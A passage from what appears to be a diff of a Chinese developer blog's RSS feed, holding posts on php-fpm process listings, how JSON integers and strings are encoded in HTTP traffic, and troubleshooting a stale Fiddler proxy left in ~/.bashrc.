style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;grep&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;master&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;process&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;o&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;root&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22325&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22326&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22327&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22328&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22329&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22330&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22331&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22332&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22333&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22334&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22335&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22336&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;22337&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22324&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fpm&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;         &lt;span style=&#34;color:#a6e22e&#34;&gt;webid&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>数据类型在网络传输中的表现</title>
+      <link>https://username.github.io/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%9C%A8%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0/</link>
+      <pubDate>Sat, 08 Jun 2019 21:56:26 +0800</pubDate>
+      <guid>https://username.github.io/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%9C%A8%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0/</guid>
+      <description>&lt;p&gt;使用弱类型语言（PHP、Python等）开发接口的时候，有时会不考虑数据类型的问题，因为语言的解释器会自动进行类型转换。当一种强类型语言根据文档调用弱类型语言开发的接口，此时弱类型语言的开发者如果没去仔细关注返回的数据类型，结果可能给接口调用方造成不便。&lt;/p&gt;
+&lt;p&gt;下面的例程使用PHP开发&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-type:application/json&amp;#34;&lt;/span&gt;);
+$arr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ 
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;world&amp;#34;&lt;/span&gt;,
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;100&amp;#34;&lt;/span&gt;,
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaaa&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chinese&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;中文字符&amp;#34;&lt;/span&gt;
+];
+&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json_encode&lt;/span&gt;($arr);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抓取http报文后可以看到字符串被转换成二进制后的表示如下&lt;/p&gt;
+&lt;p&gt;{% asset_img wireshark.png %}&lt;/p&gt;
+&lt;p&gt;整型100和字符串&amp;quot;100&amp;quot;的二进制表示的区别在于字符串&amp;quot;100&amp;quot;比整型100多出了两个双引号(&amp;quot;&amp;quot;)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;整型100&lt;/span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;            &lt;span style=&#34;color:#ae81ff&#34;&gt;00110001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110000&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;字符串&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;100&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;00100010&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00100010&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;双引号(&amp;quot;)、1和0的&lt;a href=&#34;http://www.asciitable.com/&#34;&gt;ascii码&lt;/a&gt;的二进制表示形式是&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;   =&amp;gt; 00100010
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1   =&amp;gt; 00110001
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0   =&amp;gt; 00110000
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以整型100和字符串&amp;quot;100&amp;quot;在网络传输过程中本质上都是字符串，需要通过ascii转换成对应的二进制。注意，这里中文字符串被转换成了&lt;a href=&#34;https://unicode-table.com/en/search/?q=%5Cu4e2d&#34;&gt;unicode&lt;/a&gt;，然后对unicode中的每个字符又对应到ascii转换成相应的二进制，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;中&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\u4e2d&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01011100&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01110101&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110100&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01100101&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110010&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01100100&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;符&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\u7b26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01011100&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01110101&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01100010&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110010&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00110110&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;虽然本质上都是字符串，但http报文被解析之后在应用层的表现形式会是各种数据类型，进而在内存中占用不同的空间。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>代理小故障排查</title>
+      <link>https://username.github.io/%E4%BB%A3%E7%90%86%E5%B0%8F%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/</link>
+      <pubDate>Sat, 08 Jun 2019 21:55:46 +0800</pubDate>
+      <guid>https://username.github.io/%E4%BB%A3%E7%90%86%E5%B0%8F%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/</guid>
+      <description>&lt;p&gt;昨天下班前按照&lt;a href=&#34;https://askubuntu.com/questions/922377/how-to-install-fiddler-on-ubuntu&#34;&gt;这里&lt;/a&gt;描述装了Fiddler，手机wifi设置代理通过PC上的Fiddler作为代理服务器向外网发送&lt;code&gt;http(s)&lt;/code&gt;请求 。&lt;/p&gt;
+&lt;p&gt;早上来到，关掉Fiddler，发现所有请求都被代理到&lt;code&gt;127.0.0.1:8888&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;curl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;://&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;baidu&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;com&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;curl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Failed&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8888&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Connection&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;refused&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;并没有手动更改过网络代理，而登录进来就自动设置了代理，所以需要查看下登录&lt;code&gt;login shells&lt;/code&gt;时执行的文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~/.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;profile&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# if running bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; [ &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$BASH_VERSION&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; ]; &lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# include .bashrc if it exists
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; [ &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$HOME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/.bashrc&amp;#34;&lt;/span&gt; ]; &lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;
+	&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$HOME&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/.bashrc&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;fi&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;fi&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~/.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bashrc&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;export&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http_proxy&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1:8888&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;export&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;https_proxy&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1:8888&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;export&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ftp_proxy&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;export&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socks_proxy&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~/.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bashrc&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rw&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zhangqiankun&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;root&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4099&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;月&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;home&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;zhangqiankun&lt;/span&gt;&lt;span 